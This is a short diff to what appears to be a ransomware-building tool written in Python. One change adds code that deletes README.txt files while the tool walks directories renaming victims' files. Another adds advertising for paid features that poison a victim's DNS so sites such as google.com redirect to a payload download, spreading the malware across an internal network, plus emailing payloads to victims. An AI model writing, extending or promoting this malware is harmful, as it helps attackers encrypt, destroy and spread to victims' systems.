@@ -659,6 +659,9 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                             rename_file(os.path.join(path, name))
                             print("[RENAMED] %s" % name)
                             counter+=1
+                        elif name == 'README.txt':
+                            os.remove(os.path.join(path, name))
+                            print('[DELETED] %s/%s' % (path, name))
                         else:
                             return
                     else:
@@ -818,6 +821,12 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
     Unlock further payload customization such as a custom file
     extention for encrypted files and put a header in encrypted files
     with your hacker name or payload name.
+
++ Unlock: MITM + DNS Poisoning
+    Add DNS Poisoning to your payload so when your victim executes your payload
+    the DNS is being modified, allowing you to redirect websites to other websites,
+    for example; google.com redirects to DownloadYourPayload.com. This allows
+    you to spread your payload to the entire internal network.
 
 + Unlock: Emailing
     Send your payload by Email to your victim.
